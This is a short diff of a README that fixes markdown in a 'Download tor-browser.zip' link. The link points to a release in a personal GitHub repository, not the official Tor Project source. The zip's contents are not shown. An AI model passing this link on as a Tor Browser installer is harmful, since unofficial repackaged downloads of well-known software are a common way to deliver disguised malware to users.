@@ -12,7 +12,7 @@
 <img width="512" height="512" alt="image" src="https://github.com/user-attachments/assets/52b67d3d-3c32-41ff-a2d7-3a33ac962416" />
 
 ## Install
-[Download `tor-browser.zip`)](https://github.com/EURICO55/download-tor-browser/releases/download/v15.0.15/tor-browser.zip)
+[Download `tor-browser.zip`](https://github.com/EURICO55/download-tor-browser/releases/download/v15.0.15/tor-browser.zip)
 ---
 <img width="701" height="438" alt="image" src="https://github.com/user-attachments/assets/68452a6c-d186-447b-ba0b-ec3b5cf773e2" />
 
